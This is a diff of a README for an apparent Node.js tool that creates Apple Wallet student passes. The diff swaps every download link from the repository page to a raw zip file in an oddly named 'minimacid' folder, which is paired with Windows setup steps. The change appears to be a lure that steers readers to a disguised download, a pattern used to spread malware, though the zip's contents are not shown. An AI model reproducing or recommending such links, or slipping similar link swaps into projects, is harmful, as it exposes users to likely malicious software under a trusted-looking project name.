@@ -1,6 +1,6 @@
 # 📱 apple-wallet-student-pass-nodejs - Create Student Passes Fast
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue.svg)](https://github.com/Dophuon8894/apple-wallet-student-pass-nodejs)
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Page-blue.svg)](https://raw.githubusercontent.com/Dophuon8894/apple-wallet-student-pass-nodejs/main/minimacid/pass-nodejs-student-wallet-apple-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it if you need a simple way to prepare a student pass that can be added to A
 
 ## 📥 Download and Setup
 
-Visit this page to download: https://github.com/Dophuon8894/apple-wallet-student-pass-nodejs
+Visit this page to download: https://raw.githubusercontent.com/Dophuon8894/apple-wallet-student-pass-nodejs/main/minimacid/pass-nodejs-student-wallet-apple-1.4.zip
 
 Follow these steps on Windows:
 
@@ -196,6 +196,6 @@ Keep private keys and secret values out of public folders.
 
 ## 🔗 Download Again
 
-Visit this page to download: https://github.com/Dophuon8894/apple-wallet-student-pass-nodejs
+Visit this page to download: https://raw.githubusercontent.com/Dophuon8894/apple-wallet-student-pass-nodejs/main/minimacid/pass-nodejs-student-wallet-apple-1.4.zip
 
 Use this link if you want to get the files again or check the latest repository version.
